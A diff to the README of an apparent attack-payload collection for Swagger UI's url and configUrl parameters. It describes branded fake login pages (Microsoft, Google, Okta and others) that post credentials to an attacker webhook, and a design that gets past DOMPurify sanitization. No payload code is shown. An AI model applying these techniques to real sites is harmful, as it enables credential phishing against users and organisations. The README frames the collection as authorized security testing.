@@ -1,6 +1,6 @@
 # Swagger UI Payload Collection
 
-A collection of 67 attack payloads for Swagger UI pages that accept the `?url=` or `?configUrl=` parameter. Each payload is an OpenAPI (YAML) spec that Swagger UI loads and renders — the `info.description` field is rendered as HTML inside the victim's page.
+A collection of 68 attack payloads for Swagger UI pages that accept the `?url=` or `?configUrl=` parameter. Each payload is an OpenAPI (YAML) spec that Swagger UI loads and renders — the `info.description` field is rendered as HTML inside the victim's page.
 
 > **Authorized security testing only.** Use only on targets you have permission to test (bug bounty in-scope, VDP, pentest engagement). Report findings through responsible disclosure.
 
@@ -76,7 +76,9 @@ https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/Rekha
 
 ## 3. Phishing Login Pages (`login-*.json`)
 
-Fake login forms rendered inside the real Swagger UI page. The form `action` points to your webhook — submitted credentials arrive there. These work on modern Swagger UI because DOMPurify allows `<form>`, `<input>` and `<button>`.
+Pixel-styled branded login look-alikes (Microsoft, Google, AWS, GitHub, Okta, Cloudflare, Slack, Jira, Cisco VPN, Windows Security, phpMyAdmin...). The form `action` points to your webhook — submitted credentials arrive there.
+
+**Sanitizer-proof design:** modern Swagger UI strips `style=""` attributes (DOMPurify), so these payloads are built entirely from elements that survive sanitization on EVERY version — `<table bgcolor>`, `<font color/face>`, full-width brand bars, and brand-colored image submit buttons (`<input type="image">` from the `assets/` folder). Legacy Swagger UI versions (no sanitizer) render them even better. Run `probe.json` on a target to see exactly what its UI allows.
 
 | Payload | What it looks like | What it captures |
 |---|---|---|
